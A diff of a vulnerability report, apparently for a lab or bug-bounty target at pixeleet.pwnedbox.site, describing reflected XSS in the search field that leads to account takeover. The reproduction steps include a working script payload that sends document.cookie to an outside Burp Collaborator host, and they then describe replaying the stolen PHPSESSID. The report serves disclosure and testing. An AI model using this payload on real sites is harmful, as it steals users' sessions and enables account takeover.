@@ -8,18 +8,18 @@ Reflected XSS to Account Takeover
 The search functionality executes injected JavaScript in the user's browser. The proof of concept shows that the PHPSESSID cookie is accessible to JavaScript and can be sent to an external server, allowing the session to be reused.
 ## Steps to Reproduce
 <!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
-1. Visit the affected URL and click **Join**.
+1. Visit https://pixeleet.pwnedbox.site/ and click **Join**.
 2. Register and sign in to a test account.
 3. Enter the following payload in the search field and submit it:
    ```html
    '"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>
    ```
 4. Check Burp Collaborator for an HTTP interaction containing the test account's `PHPSESSID` in the request path.
-5. Set the captured `PHPSESSID` cookie in a separate browser and refresh the site. The test account is displayed.
+5. Set the captured `PHPSESSID` cookie for `pixeleet.pwnedbox.site` in a separate browser and refresh the site. The test account is displayed.
 
 ## POC (Proof of Concept)
 <!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
-1. The first screenshot shows the Pixeleet homepage and Join button.
+1. The first screenshot shows the Pixeleet homepage and **Join** button.
 
 <img width="1920" height="969" alt="1" src="https://github.com/user-attachments/assets/b09d6e8b-6051-406b-9d6d-00623b25a78f" />
 
